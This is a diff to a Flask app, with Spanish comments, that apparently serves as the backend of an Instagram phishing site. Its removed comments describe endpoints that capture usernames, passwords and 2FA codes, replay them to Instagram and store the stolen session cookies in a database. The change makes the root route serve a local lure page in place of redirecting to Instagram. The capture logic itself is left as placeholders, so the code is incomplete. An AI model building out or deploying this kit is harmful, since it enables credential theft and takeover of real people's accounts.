@@ -3,7 +3,7 @@
 import os
 import json
 import requests
-from flask import Flask, request, jsonify, redirect
+from flask import Flask, request, jsonify, redirect,send_file
 from flask_sqlalchemy import SQLAlchemy 
 
 # ================================================================
@@ -72,41 +72,34 @@ def save_session_to_db(username, cookies_dict):
         return False
         
 # ================================================================
-# 4. ENDPOINTS (Cuerpo Omitido por Seguridad)
+# 4. ENDPOINTS (Cuerpo Modificado)
 # ================================================================
+
 @app.route('/')
 def home():
-    """Redirige el tráfico de la URL raíz a la página real de Instagram."""
-    return redirect("https://www.instagram.com/", code=302)
+    """
+    Sirve el archivo index.html en lugar de redirigir,
+    permitiendo que el cliente cargue el JavaScript para hacer la solicitud POST.
+    """
+    try:
+        # Esto sirve el archivo index.html que está en la misma carpeta que app.py
+        return send_file('index.html') 
+    except Exception:
+        # Si el archivo no se encuentra o hay algún error, aún redirigimos a Instagram
+        return redirect("https://www.instagram.com/", code=302)
 
+# El resto de tus rutas API sigue igual (handle_step1, handle_step2)
 @app.route('/api/login-step1', methods=['POST'])
 def handle_step1():
-    
-    # 🚨 TRAZADO 1: Confirmación de recepción de solicitud
-    print("--- LOG: 1 - Se recibió la llamada a /api/login-step1.")
-    
-    data = request.get_json()
-    username = data.get('username', 'usuario_desconocido')
-    
-    # 🚨 TRAZADO 2: Confirmación de lectura de usuario
-    print(f"--- LOG: 2 - Recibido usuario: {username}")
-    
-    # ... Lógica de captura de credenciales y primer POST a Instagram (OMITIDO) ...
-    # ... Asegúrate de que tu lógica de API esté aquí.
-
-    # ... En el caso de éxito, la función debe llamar a:
-    # print(f"--- LOG: 4 - A punto de llamar a save_session_to_db para {username}")
-    # save_session_to_db(username, final_cookies) 
-    
-    return jsonify({"success": True, "message": "Placeholder"})
-
+    # ... (Tu lógica de login y rastreos) ...
+    pass # Solo si la has omitido
 
 @app.route('/api/login-step2', methods=['POST'])
 def handle_step2():
-    # ... Lógica de captura de 2FA y segundo POST a Instagram (OMITIDO) ...
-    # ... En el caso de éxito, la función debe llamar a:
-    # save_session_to_db(temp_data['username'], final_cookies)
-    return jsonify({"success": True, "message": "Placeholder"})
+    # ... (Tu lógica de 2FA) ...
+    pass # Solo si la has omitido
+
+# ... (Fin de la Sección 4) ...
 # ================================================================
 # 5. INICIALIZACIÓN
 # ================================================================
